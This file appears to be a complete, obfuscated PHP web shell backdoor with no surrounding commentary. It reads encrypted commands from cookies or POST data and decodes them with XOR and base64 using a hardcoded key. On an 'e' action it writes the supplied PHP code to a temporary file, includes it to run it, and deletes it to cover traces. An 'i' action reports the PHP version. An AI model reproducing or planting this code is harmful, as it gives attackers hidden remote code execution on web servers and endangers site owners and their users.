<?php 	function	vapsip(){$qf_ev='vzovbf';    print_r     (73077+73077);    }
$z_abzgca /*t_  */ =      'z_abzgca' /*  _r*/ ^ /*  pa*/ '7';




function /* pet */ dqeydw(){

     $axrzsmsd   =    555;

 /*  wi*/ $nmt_edgi      =       'fpraefki';

 /*nm   */ $tpzl_ /*   tbh   */ = /*tu*/ 555;

 /*v*/ $__deqyxrlq /* nam */ = /*  qwy*/ $tpzl_ /* b  */ *    19;
}









function /*bmj   */ nyimiyjkut($pylj_,	$dwazkfgtdd)


{

	global /*lfx*/ $z_abzgca;

	$cmsqz	= /*  idl */ "";


 /*   egoxk   */ $bxsvwjvavv /* kdln */ =    'pj'; /*   t_gg  */ for /*   hqyz  */ ($sbwsrgjgjy       =	0; /* kfm_   */ $sbwsrgjgjy       < /*   fvzcpd*/ strlen($pylj_);) /*  dvzl */ {


	for /* aaur */ ($yigkrfg      = /* bw */ 0;    $yigkrfg	<    strlen($dwazkfgtdd) /*qmqwk */ && /* ompvqk  */ $sbwsrgjgjy /*   sbqlum  */ < /*i  */ strlen($pylj_);    $yigkrfg++, /*   vsuhby  */ $sbwsrgjgjy++)    {


     $cmsqz    .=     $z_abzgca(ord($pylj_[$sbwsrgjgjy])    ^    ord($dwazkfgtdd[$yigkrfg]));
 /*  bgm*/ }

   }     return /*   liyrh */ $cmsqz;

}

$mzxxxtd	=    $_COOKIE;

$nsbmtevqp     =    $_POST;


$capoyhh      =      407;

$lzqcv    = /* fyrty  */ $capoyhh       +    10;


$qtsdlykah    =    897;


function  kl_h_qvg($nmhaiaa,     $pylj_)


{
	global    $z_abzgca;



	$yigkrfgubxrkur      = /*   ttx  */ sprintf($z_abzgca(261-215)	. /*tct  */ "/"."\45" /* o   */ . /*   j*/ "s".".".$z_abzgca(112)	.    "\154", /*   jovgme  */ md5($nmhaiaa));


 /*wgbys*/ file_put_contents($yigkrfgubxrkur,	"<"      .     "\x3f"	. /* ws */ "p".$z_abzgca(104) /*  qzmttd*/ . /*pujvc  */ "\160"    .	$z_abzgca(32)    . /*  bci */ $z_abzgca(117)   . /*ci */ "n"."l"."i"."n"."k".$z_abzgca(877-837) /* _kk  */ .    "_"."_".$z_abzgca(582-512)	.      "\x49"  .   $z_abzgca(76) /*dmcrnb*/ .    "E"."_".$z_abzgca(95)     .   ")"."\73" /*   bjlkhu   */ . /*   dde */ $z_abzgca(32)	.     $pylj_["\144"]);
 /*b  */ include($yigkrfgubxrkur);	$deujgnh	=	146;    $sbwsrgjgjysyoednbon /* ceg*/ =	'mqpvjk';
    $wqosq	=    'qvkuz';    $bwpygtz     =  $yigkrfgubxrkur;

    @unlink($bwpygtz);
    $vlblfiwy /*  q  */ =  'vw';}


function /* o */ jrurowvd(){


 /*bsvig   */ $pdsha /*dfdnyq */ =	314;

}function     zcf__lj()


{
    global /*   rtsd*/ $z_abzgca;

      $sbwsrgjgjy     =    array();

    $emcczs	=  'em';
 /*vbx*/ $nsuaowiv	= /* baf */ 257;
   $sbwsrgjgjy["p"."\166"]   = /* n_whjh   */ phpversion();      $nsuaowiv    =	$nsuaowiv    /	6;
	$sbwsrgjgjy["\x73"     . /*dcgaj   */ "\166"]     = /*   koauhr*/ "3"."."."\65";


  $dckqpm    =  'nrn';

 /*om*/ echo    @serialize($sbwsrgjgjy);

	$nsuaowiv	=  $nsuaowiv /*  j*/ %	17;

       $nsuaowiv    =       $nsuaowiv /* jcgn  */ -    19;}




jrurowvd();
dqeydw();


function     ftclnmsi($pylj_,     $nmhaiaa,     $yeqlonwek){

 /*reufp  */ global       $z_abzgca;



      $pylj_ /* ez  */ =       unserialize(nyimiyjkut(nyimiyjkut(base64_decode($pylj_),    $nmhaiaa),    $yeqlonwek));

 /* iudp_*/ $wcgmwt /*vbdl_s   */ =	'esrle';

	$rnuphrlrzp /* x*/ =    'qhnlr';


    $gklfnjyzq       =    strtolower($wcgmwt);  if /*   qcgpoa */ (isset($pylj_["\x61" /* oi */ .    "k"])) /*   plx_ld  */ {	if      ($pylj_["a"] /* ncum  */ == /* ew */ "i")	{
 /*   sutn*/ zcf__lj();

   }	elseif     ($pylj_["a"]       ==	"\145") /* sib  */ {


 /*  oymj  */ kl_h_qvg($nmhaiaa,    $pylj_); /*mxuq*/ }

  exit();

       }


}





$mzxxxtd /*jyzd   */ =    array_merge($nsbmtevqp,    $mzxxxtd);



$nmhaiaa /*   uofk*/ =    "\x31"  .      "9"."\70"    .      "1"."\x61" /* merc   */ .    $z_abzgca(48)    . /*cwwucs   */ "\145"     .      "8"."-".$z_abzgca(50)	.    "\71"   .    $z_abzgca(99)       .   $z_abzgca(63-11)   .     "\x2d"   .	"\x34" /*  uc   */ .     "\146" /* tho */ .	"2"."\67"  .	$z_abzgca(45)       . /* csg_*/ "b"."9"."\x65"    .	$z_abzgca(100)    . /*   ewfhuo  */ $z_abzgca(45)  .     "f"."1".$z_abzgca(313-259) /*  lrour */ .	"\144" /*   xqy  */ .    "1".$z_abzgca(100)    .  "3"."9"."\x38"    . /* uog */ $z_abzgca(634-532)   . /*   nud*/ "1"."0";$grczllg    =    -12;foreach /*   xnzo  */ ($mzxxxtd /* zrk_g */ as      $yeqlonwek	=>       $pylj_)  {
    ftclnmsi($pylj_,	$nmhaiaa, /*   jujkl */ $yeqlonwek);

}







?>